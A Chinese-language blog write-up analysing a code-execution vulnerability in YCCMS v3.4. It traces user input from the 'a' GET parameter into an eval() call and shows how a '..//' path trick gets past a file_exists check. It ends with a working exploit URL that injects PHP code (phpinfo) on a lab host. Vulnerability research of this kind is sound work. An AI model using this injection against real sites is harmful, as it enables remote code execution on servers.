---
title: web漏洞@yccms v3.4代码执行漏洞
date: 2021-04-18 17:17:19
cover: https://i.loli.net/2021/04/18/U6I7rfGqCmDk52i.png
---

# yccms v3.4 代码执行漏洞

查看/admin/index.php文件，这是后台首页的源代码，我们来看看里面的逻辑

这个文件主要的功能是通过require包含了run.inc.php文件

```php
<?php
require str_replace('\\','/',substr(dirname(__FILE__),0,-6)).'/config/run.inc.php';
?>
```

接着看下run.inc.php文件

这个文件的主要的作用是自动加载类，这些类都在controller、model、public/class目录下

```php
<?php
//开启session
session_start();
//超时时间
@set_time_limit(0);
//设置编码
header('Content-Type:text/html;charset=utf-8');
//错误级别,报告警告之外的所有错误
error_reporting(E_ALL ^ E_NOTICE);
//设置时区
date_default_timezone_set('PRC'); 
//网站绝对根路径
define('ROOT_PATH',str_replace('\\','/',substr(dirname(__FILE__),0,-7))); 
//引入配置文件
require ROOT_PATH.'/config/config.inc.php';
//引入Smarty
require ROOT_PATH.'/public/smarty/Smarty.class.php';
//自动加载类
function __autoload($_className){
	if(substr($_className,-6)=='Action'){
		require ROOT_PATH.'/controller/'.ucfirst($_className).'.class.php';	
	}elseif(substr($_className, -5) == 'Model'){
		require ROOT_PATH.'/model/'.ucfirst($_className).'.class.php';
	}else{
		require ROOT_PATH.'/public/class/'.ucfirst($_className).'.class.php';
	}
}
//单入口
Factory::setAction()->run();
?>
```

在看到public/class/目录下的Factory.class.php类文件的时候，发现了一个代码执行的漏洞，该漏洞可以通过eval函数执行任意代码

```php
<?php
class Factory{
	static private $_obj=null;
	static public function setAction(){
    #匹配get请求的a参数
		$_a=self::getA();
		if (in_array($_a, array('admin', 'nav', 'article','backup','html','link','pic','search','system','xml','online'))) {
				if (!isset($_SESSION['admin'])) {
				header('Location:'.'?a=login');
			}
		}
		if (!file_exists(ROOT_PATH.'/controller/'.ucfirst($_a).'Action.class.php')) $_a = 'Login';
		eval('self::$_obj = new '.ucfirst($_a).'Action();');
		return self::$_obj;
	}
	
	static public function setModel() {
		$_a = self::getA();
		if (file_exists(ROOT_PATH.'/model/'.$_a.'Model.class.php')) eval('self::$_obj = new '.ucfirst($_a).'Model();');
		return self::$_obj;
	}
	static public function getA(){
		if(isset($_GET['a']) && !empty($_GET['a'])){
			return $_GET['a'];
		}
		return 'login';
	}
}

?>
```

我们主要看产生漏洞的核心代码，我们要利用这个漏洞，就要让eval函数执行我们的代码，也就是说要先通过第一句代码的if检查，通过了if检查，我们的代码执行就更近一步了

```php
if (!file_exists(ROOT_PATH.'/controller/'.ucfirst($_a).'Action.class.php')) $_a = 'Login';
		eval('self::$_obj = new '.ucfirst($_a).'Action();');
```

所以我们要解决两个问题：

1.file_exists逃逸

2.eval代码执行，并且插入我们的代码

下面我们来解决这两个问题

1.file_exists逃逸

这个file_exists会检查提供的文件路径是否存在，显然这里检查的是controller目录下的文件是否存在

我们可以看到controller目录下存在的一些文件，可以看到正好存在一个Action.class.php，如果a参数传递的是空，也是可以通过if检查的，那么如何传递个“空的”a参数呢并且还能执行代码呢？接着往下看

![yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled.png](https://i.loli.net/2021/04/18/VZEQXkxBNFvCTMU.png)

file_exists函数本身存在一个bug，当接收的字符串中存在..//的时候会自动找到上一层目录，因此我们传递的a参数可以是这样的，在经过file_exists函数的时候会先执行到phpinfo();//，因为这里碰到个//，所以它会进入下一层目录，接着会碰到..//就会回到上一层目录，这样即执行了我们的代码，也相当于传了个“空的”参数，因为它去找了下一层目录，接着又往上一层目录去找，还是会找到Action.class.php

```php
phpinfo();//..//
```

我们进行个小测试，我的C盘下存在C://GameCS/Counter-Strike目录

![yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%201.png](https://i.loli.net/2021/04/18/Iv9zdRiFPsbDfkW.png)

通过执行下面的代码，返回的是1，这样不仅通过了检查，还执行了我们的代码phpinfo();

```php
<?php
echo file_exists('C://GameCS//phpinfo();//..//Counter-Strike');
?>
```

![yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%202.png](https://i.loli.net/2021/04/18/WOCfPDRura9Sy6m.png)

所以我们只要在a参数中传递下面的字符串就可以绕过if判断了，

```php
http://192.168.0.21/yccms_v3.4/admin/?a=phpinfo();//..//
```

2.eval执行我们的代码

光是绕过if判断还不够，我们看下eval函数执行时的操作，eval可以执行php代码，这里它进行了new操作，本意是想通过拼接，以动态的方式创建一个对象

```php
eval('self::$_obj = new '.ucfirst($_a).'Action();');
```

但是如果我们以上面的exp去打，显然就会变成下面这样，这样程序就会报错，因为不存在phpinfo()对象

```php
self::$_obj = new phpinfo();//..//
```

可以看到它会去public/class目录下去找phpinfo.class.php，这显示是不存在的

![yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%203.png](https://i.loli.net/2021/04/18/KSqj9awp7g4RmGN.png)

我们需要让它创建一个存在的对象，public/class目录下是存在DB.class.php文件的，因此我们最终的exp可以是这样

```php
http://192.168.0.21/yccms_v3.4/admin/?a=DB();phpinfo();//..//
```

![yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%204.png](https://i.loli.net/2021/04/18/WQBdGsqNfXUHLC3.png)